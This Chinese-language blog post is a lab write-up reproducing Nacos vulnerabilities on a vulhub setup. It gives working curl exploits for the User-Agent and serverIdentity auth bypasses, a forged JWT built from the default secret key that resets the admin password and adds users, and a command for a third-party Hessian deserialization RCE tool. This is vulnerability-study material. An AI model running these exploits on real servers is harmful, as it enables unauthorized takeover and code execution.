---
title: nacos漏洞复现
subtitle:
date: 2024-08-15T09:31:01+08:00
slug: 71
draft:  false
author: 
  name: 东隅
  link:
  email: 735587142@qq.com
  avatar: 
description:
keywords:
license:
comment: false
weight: 0
tags:
  - 攻防
  - 漏洞复现
categories:
  - 攻防
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRss: false
hiddenFromRelated: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: true
  url:

# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter
---

<!--more-->



为了方便直接用vulhub

版本：NACOS v1.4.0

```
cd vulhub-master\nacos\CVE-2021-29441 
docker compose up -d
docker compose restart nacos
```

某些情况下nacos服务会启动失败（无法连接数据库导致），可以重启nacos服务或者重启所有服务 访问http://127.0.0.1:8848/nacos/#/login

默认账号密码都是nacos

# Nacos未授权访问CVE-2021-29441

## 漏洞简介

该漏洞发生在nacos在进行认证授权操作时，会判断请求的user-agent是否为”Nacos-Server”，如果是的话则不进行任何认证。开发者原意是用来处理一些服务端对服务端的请求。但是由于配置的过于简单，并且将协商好的user-agent设置为Nacos-Server，直接硬编码在了代码里，导致了漏洞的出现。并且利用这个未授权漏洞，攻击者可以获取到用户名密码等敏感信息。

## 影响版本

Nacos <= 2.0.0-ALPHA.1

## 漏洞复现

查看用户列表：http://192.168.80.131:8848/nacos/v1/auth/users?pageNo=1&pageSize=1
直接get方式访问该路径会403，将user-agent头修改为Nacos-Server即可绕过403。

![image-20240406140153768](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404061401085.webp)

此时看到响应包中包含了系统存在的用户名nacos，密码为加盐之后的值。
添加一个新用户。

![image-20240406140240186](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404061402455.webp)

再用刚刚的方法查看所有用户

![image-20240406140425352](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404061404553.webp)



# Nacos2.2.0 identity key value 硬编码权限绕过

影响版本：Nacos <= 2.2.0 nacos.core.auth.enabled=true
当请求头携带"serverIdentity:security"时 可绕过权限认证

如果没有或者不对应则返回403

利用：
添加用户接口

```
curl -X POST "http://192.168.111.3:8848/nacos/v1/auth/users?username=admin2&password=123456" -H "serverIdentity: security"
```



# Nacos默认key导致权限绕过登陆QVD-2023-6271

## 漏洞简介

Nacos中发现影响Nacos <= 2.1.0的问题，Nacos用户使用默认JWT密钥导致未授权访问漏洞。 通过该漏洞，攻击者可以绕过用户名密码认证，直接登录Nacos用户。影响版本：0.1.0<=Nacos<=2.1.0

## 漏洞复现

在nacos中，token.secret.key值是固定死的，在application.properties中可以看到
secret.key的值默认为SecretKey012345678901234567890123456789012345678901234567890123456789

![image-20240406144453798](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404061444924.webp)

在得到key的值后我们可以任意伪造jwt

获取token
利用该默认的key进行jwt构造，直接进入后台，构造方法：
在jwt.io在线网站中，输入默认key：`SecretKey012345678901234567890123456789012345678901234567890123456789`，然后修改payload的值。exp参数的值是unix时间戳，这个时间戳代表着accessToken的过期时间，所以要将时间戳往后面设。

![image-20240406145402248](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404061454357.webp)

![image-20240406150530341](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404061505521.webp)

利用一：修改nacos用户密码，将密码修改为123456

```
curl -X PUT "http://192.168.80.131:8848/nacos/v1/auth/users?username=nacos&newPassword=123456&pageNo=1&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5MzA1OTQyMX0.rh3mpIO1GQ8liXkza9ZRoi2u21S1uhKVFioxAwkIrFk"
```

利用二：新建用户
`curl "http://192.168.80.131:8848/nacos/v1/auth/users" -X POST -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5MzA1OTQyMX0.rh3mpIO1GQ8liXkza9ZRoi2u21S1uhKVFioxAwkIrFk" -d "username=test1&password=test`

![image-20240406145825478](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404061458657.webp)

利用三：利用accessToken登录，密码错误也可以直接登录。

![image-20240406150451339](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404061504501.webp)







# Hessian 反序列化 RCE

https://github.com/c0olw/NacosRce

直接用大佬的工具一把嗦

1.4.0 <= Nacos < 1.4.6 

2.0.0 <= Nacos < 2.2.3
Nacos默认的7848端口是用于Nacos集群间Raft协议的通信，该端口的服务在处理部分Jraft请求时会使用Hessian进行反序列化

```
java -jar NacosRce.jar http://192.168.111.:8848/nacos  7848 "whoami"
```













